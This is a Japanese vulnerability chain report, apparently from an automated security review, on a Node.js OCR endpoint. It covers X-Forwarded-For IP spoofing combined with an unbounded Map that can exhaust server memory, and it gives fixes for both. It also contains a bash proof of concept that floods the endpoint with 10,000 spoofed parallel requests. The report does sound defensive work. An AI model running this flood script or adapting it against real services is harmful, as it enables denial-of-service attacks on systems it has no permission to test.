# 🔗 組み合わせ攻撃チェーン - IPスプーフィング + メモリ枯渇攻撃

## メタデータ
```yaml
chain_id: chain-001
version: v1
cvss_score: 6.5
severity: Medium
attack_complexity: Low
discovered_iteration: 1
component_vulns: [vuln-002, vuln-005]
attack_path_length: 2 steps
exploit_time: 5 minutes
```

## 🎯 攻撃概要
IPスプーフィングとメモリ枯渇の脆弱性を組み合わせることで、少数の攻撃者が大量のユニークIPを偽装してfailedValidationCounterのメモリを枯渇させ、サービス停止を引き起こす。

## 🔗 構成脆弱性

### Step 1: IPスプーフィング (vuln-002)
- **ID**: vuln-002
- **種別**: IP Spoofing
- **詳細**: [📄](../individual/vuln-002_js-ip-spoofing_ocr-route_v1.md)
- **得られるもの**: 任意のIPアドレスを偽装してリクエストを送信可能

### Step 2: メモリ枯渇 (vuln-005)
- **ID**: vuln-005
- **種別**: DoS (Memory Exhaustion)
- **詳細**: [📄](../individual/vuln-005_js-dos_memory-exhaustion_v1.md)
- **得られるもの**: サーバーのメモリを枯渇させてサービス停止

## 💣 完全な攻撃シナリオ

### 前提条件
- [ ] HTTPクライアント（curl等）
- [ ] 少数の攻撃マシン

### 攻撃フロー
```
1️⃣ 攻撃者が偽のX-Forwarded-Forヘッダーを準備
   ↓
2️⃣ vuln-002: IPスプーフィング
   各リクエストで異なるIPアドレスを偽装
   curl -H "X-Forwarded-For: 1.2.3.x"
   ↓
3️⃣ vuln-005: failedValidationCounterに大量のエントリ作成
   無効な画像データで意図的にバリデーションエラーを発生
   ↓
4️⃣ Mapのサイズが無制限に成長
   ↓
5️⃣ Node.jsプロセスのメモリ枯渇
   ↓
6️⃣ サービス停止
```

### 所要時間
- IPスプーフィングの準備: 1分
- 大量リクエスト送信: 3分
- メモリ枯渇: 1分
- **合計**: 約5分

## 🎭 影響評価

### CVSS 3.1: 6.5
```
CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H
```

### ビジネスインパクト
- **直接**: サービス停止によるユーザー体験の低下
- **二次**: インシデント対応コスト、信頼性への影響

## 🛡️ 包括的対策

### 緊急対応
1. **vuln-002修正**: `trust proxy`設定の適切な構成
   ```javascript
   // api/index.js
   // ❌ Before
   // trust proxyの設定なし
   
   // ✅ After
   app.set('trust proxy', 1);
   ```

2. **vuln-005修正**: Mapサイズの上限設定
   ```javascript
   // api/routes/ocr.js
   // ❌ Before
   failedValidationCounter.set(ip, count);
   
   // ✅ After
   const MAX_ENTRIES = 10000;
   if (failedValidationCounter.size >= MAX_ENTRIES) {
       const firstKey = failedValidationCounter.keys().next().value;
       failedValidationCounter.delete(firstKey);
   }
   failedValidationCounter.set(ip, count);
   ```

### 長期対策
- [ ] Redisベースのレート制限（本番環境では既に使用）
- [ ] WAF（Web Application Firewall）の導入
- [ ] クラウドフロント等のDoS防御サービスの検討

## 🔬 検証PoC

**警告**: 教育目的のみ

```bash
#!/bin/bash
# DoS攻撃シミュレーション（自己テスト環境のみ）
# 本番環境では絶対に実行しないでください

TARGET="http://localhost:3000/api/ocr"

for i in {1..10000}; do
    IP="192.168.$((i/256)).$((i%256))"
    curl -s -X POST "$TARGET" \
        -H "Content-Type: application/json" \
        -H "X-Forwarded-For: $IP" \
        -d '{"image": "invalid"}' > /dev/null &
    
    # 100並列ごとに少し待機
    if [ $((i % 100)) -eq 0 ]; then
        wait
        echo "Sent $i requests"
    fi
done

echo "Attack simulation complete"
```

## 📊 検出コンテキスト

### 検出経緯
- **イテレーション1**: vuln-002 (IPスプーフィング) 検出
- **イテレーション1**: vuln-005 (メモリ枯渇) 検出
- **イテレーション1**: チェーン認識 - 両脆弱性の組み合わせによる影響増大

---
*Chain Analysis | 2025-11-26*
